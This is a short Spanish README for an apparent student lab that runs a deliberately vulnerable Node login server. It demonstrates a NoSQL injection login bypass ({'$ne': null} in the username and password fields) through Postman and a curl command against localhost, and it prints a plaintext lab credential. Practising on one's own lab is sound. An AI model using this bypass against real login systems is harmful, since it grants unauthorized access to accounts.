NoSQL-Inyection

INSTALACIÓN Y USO (en Linux o Windows)

Clona el repo
Abre la terminal y escribe esto:
git clone https://github.com/JavierNila/NoSQL-Inyection.git
cd NoSQL-Inyection

Instala lo que necesita
Dentro de la carpeta del proyecto:
npm install
npm install cors
Eso va a bajar todas las cosas necesarias. El cors es para que el navegador no se queje.

Corre el servidor
Lánzalo con:
node server.js
Va a estar corriendo en http://localhost:3000

Abre el frontend
Solo abre el archivo index.html en tu navegador. Ya con eso.

CÓMO SE USA

Escribes un usuario y contraseña en la página (la de index.html)

Le das a “Ingresar” y eso manda los datos al backend en http://localhost:3000/login

Si quieres probar inyecciones NoSQL, puedes usar Postman o directamente desde la terminal con curl

POSTMAN
Abres Postman, haces un POST a http://localhost:3000/login
Vas a “Body”, eliges “raw” y formato JSON
Pegas esto:

{
  "username": { "$ne": null },
  "password": { "$ne": null }
}

Y le das enviar. Deberías entrar sin usar credenciales reales.

Si prefieres terminal, escribe esto:
curl -X POST http://localhost:3000/login -H "Content-Type: application/json" -d '{"username": { "$ne": null }, "password": { "$ne": null }}'

Y listo, te deja entrar por la vulnerabilidad de NoSQL Injection.

IMPORTANTE
Las credenciales que nos otorgaron (username: student, password: dPgF0sb0ADBUZHCI) no funcionan
